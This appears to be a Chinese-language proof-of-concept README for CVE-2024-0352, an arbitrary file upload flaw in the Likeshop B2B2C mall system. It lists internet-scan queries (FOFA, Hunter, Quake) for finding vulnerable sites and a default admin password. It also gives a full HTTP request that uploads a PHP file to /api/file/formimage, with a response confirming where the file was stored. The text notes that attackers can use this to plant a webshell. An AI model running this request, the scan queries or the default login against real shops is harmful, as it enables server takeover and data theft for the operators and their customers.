# CVE-2024-0352

> **Created by：** A-little-dragon
>
> **Team：** TracelessSec
>
> **漏洞描述：** Likeshop任意文件上传



## 漏洞描述

Likeshop是一个100%开源免费的B2B2C多商户商城系统，支持官方旗舰店，商家入驻，平台抽佣+商家独立结算，统一下单+订单拆分等功能。该产品存在任意文件上传，攻击者可通过此漏洞上传木马获取服务器权限。

## 影响版本

```python
version<= 2.5.7.20210311
```

## 网络空间测绘语法

### FOFA

```bash
icon_hash="874152924”
```

### 鹰图

```bash
web.icon=="b2e68d0acf5b3117f88421799920ab98”
```

### 夸克

```bash
favicon: "b2e68d0acf5b3117f88421799920ab98”
```

## 漏洞复现

### 弱口令

**账号：** admin **密码：** 123456

![Untitled](image/Untitled.png)

![Untitled](image/Untitled%201.png)

### Exp

**Request 包**

```python
POST /api/file/formimage HTTP/1.1
Host: xxxxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Length: 206

------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="file";filename="phpinfo.php"
Content-Type: application/x-php

<?php phpinfo();?>
------WebKitFormBoundaryJpMyThWnAxbcBBQc--
```

**response 包**

```python
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 18 Jan 2024 01:26:18 GMT
Content-Type: application/json; charset=utf-8
Connection: keep-alive
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: Authorization, Sec-Fetch-Mode, DNT, X-Mx-ReqToken, Keep-Alive, User-Agent, If-Match, If-None-Match, If-Unmodified-Since, X-Requested-With, If-Modified-Since, Cache-Control, Content-Type, Accept-Language, Origin, Accept-Encoding,Access-Token,token
Access-Control-Allow-Methods: GET, POST, PATCH, PUT, DELETE, post
Access-Control-Max-Age: 1728000
Access-Control-Allow-Credentials: true
Content-Length: 233

{"code":1,"msg":"上传文件成功","data":{"url":"http:\/\/xxxxxxxxxxx\/uploads\/user\/xxxxxxxxxxxx.php","base_url":"uploads\/user\/xxxxxxxxxxxx.php","name":"phpinfo.php"},"show":0,"time":"0.086435"}

```

![Untitled](image/Untitled%202.png)
